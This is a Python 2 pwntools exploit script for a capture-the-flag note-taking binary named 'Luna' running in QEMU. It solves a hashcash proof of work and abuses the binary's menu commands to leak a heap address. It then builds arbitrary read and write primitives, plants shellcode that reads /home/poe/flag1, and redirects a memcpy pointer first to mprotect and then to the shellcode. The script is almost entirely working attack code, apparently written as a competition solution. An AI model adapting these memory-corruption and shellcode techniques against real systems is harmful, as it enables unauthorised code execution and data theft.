from pwn import *
from binascii import hexlify

import sys, os

log.info("For remote: %s HOST PORT" % sys.argv[0])
bin_name = "./luna"
context.terminal = ["tmux", "splitw", "-h"]

"""
cmd = 
b * {}
b * {}
b * {}
c
.format (0x555555554000 + 0x56db, 0x555555554000 , 0x555555554000 + 0x56c1)
"""
try:
  r = remote(sys.argv[1], int(sys.argv[2]))
  r.recvuntil ("-mb25 ")
  hash_seed = r.recvline ()[:-1]
  print "hash_seed:" + hash_seed
  hash_args = ["hashcash", "-mb25", hash_seed]
  pp = process (hash_args)
  r.sendline (pp.recvline ()[:-1].split ("token: ")[1])
except:
#  r = process (bin_name)
  r = process(["./x86_64-softmmu/qemu-system-x86_64", 
      "-kernel", "./bzImage", "-initrd", "./initramfs.cpio.gz", 
      "-nographic", "-monitor", "none", "-cpu", "qemu64", 
      "-append", "\"console=ttyS0 kaslr panic=1\"", 
      "-device", "tpu", "-m", "256M"])


def do_debug (cmd = ""):
  try:
    if sys.argv[1] == 'debug':
      gdb.attach (r, cmd)
  except:
    pass

elf = ELF (bin_name)
context.word_size = elf.elfclass

libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc

#context.log_level = 'debug'

def rr ():
  r.recvuntil (">>> ")

def menu (index):
  rr ()
  r.sendline (str(index))

r.recvuntil("Luna - the Legendary Ultra Note Accelerator")


def menu_i(index, text):
        r.sendlineafter(">>> ", "i {} {}".format(index, text))
        return

def menu_n():
        r.sendlineafter(">>> ", "n")
        return

def menu_s(tab):
        r.sendlineafter(">>> ", "s {}".format(tab))
        return

def menu_d(index, length):
        r.sendlineafter(">>> ", "d {} {}".format(index, length))
        for i in xrange(1):
                r.recvline()
        return r.recvuntil("-------------------", drop = True)[:-2]  # 0d 0a

def menu_c(index, length):
        r.sendlineafter(">>> ", "c {} {}".format(index, length))
        return

def menu_p(index):
        r.sendlineafter(">>> ", "p {}".format(index))
        return

def menu_r(index, length, char):
        r.sendlineafter(">>> ", "r {} {} {}".format(index, length, char))
        return

def menu_R(index, length):
        r.sendlineafter(">>> ", "R {} {}".format(index, length))
        return

def menu_D(index, length):
        r.sendlineafter(">>> ", "D {} {}".format(index, length))
        return

def menu_q():
        r.sendlineafter(">>> ", "q")
        return
def write(addr, data):
	# set address
	menu_s(0)
	for i in range(8):
		menu_r(80 + i, 1, p64(addr)[i] if p64(addr)[i] != '\x7f' else '\x16\x7f')
	menu_r(72, 1, '\0')
	menu_r(64, 1, '\xff')
	menu_r(65, 1, '\xff')
	# write	
	menu_s(1)
	for i in range(len(data)):
		menu_r(i, 1, "\x16"+data[i])
	return

def read(addr):
	# set address
	menu_s(0)
	for i in range(8):
		menu_r(80 + i, 1, p64(addr)[i].replace("\x04", "\x16\x04").replace("\x7f","\x16\x7f"))
	menu_r(72, 1, '\0')
	menu_r(64, 1, '\xff')
	menu_r(65, 1, '\xff')
	# read	
	menu_s(1)
	return menu_d(0, 8)


# abuse
menu_s(0)
menu_i(0, 'lemon')
menu_c(0, 5)
menu_n()
menu_i(0, '1'*0xf0)
menu_c(0, 0xe0)
menu_s(0)
menu_p(0)

heap = u64(menu_d(0, 8 * 7)[-8:])
log.success(hex(heap))

shellcode = ""
shellcode += asm (shellcraft.amd64.open("/home/poe/flag1", 0), arch='amd64', os='linux')
shellcode += asm (shellcraft.amd64.read('rax', heap, 0x80), arch='amd64', os='linux')
shellcode += asm ("mov ax, 1; mov rdi, rax; syscall", arch='amd64', os='linux')
log.success(hexlify(shellcode))
for i in range(len(shellcode) / 8 + 1):
        log.failure(i)
        write(heap + 0x500 + 8*i, shellcode[8*i:8*(i+1)].ljust(8, "\x90"))

for i in range(10):
        menu_n()
menu_s(10)
menu_i(0, '1'*0xa0)

# overwrite memcpy to mprotect
write(0x6D7038, p64(0x44B930))
#write(0x6D7050, p64(0x425A10))

# call mprotect
menu_s(11)
menu_i(0, '2'*7)

# overwrite memcpy to shellcode
write(0x6D7038, p64(heap + 0x500))
#write(0x6D7038, p64(0x00401191))
#write(0x6D7038, p64(0x0400FF4))


# call shellcode
menu_s(9)
menu_i(0, '1')
#log.success(hexlify(read(0x400000)))
"""
res = []
for i in xrange(20):
        log.info(i)
        res.append(read(heap + 0x500 + 8*i))
res = list(map(u64, res))

for i in xrange(0, len(res), 2):
        print hex(heap + 0x500 + i*8) + ':  ' + '0x' + hex(res[i])[2:].zfill(16) + '    0x' + hex(res[i+1])[2:].zfill(16)
#log.success(hexlify(read(0x6D7038)))
"""
r.interactive()
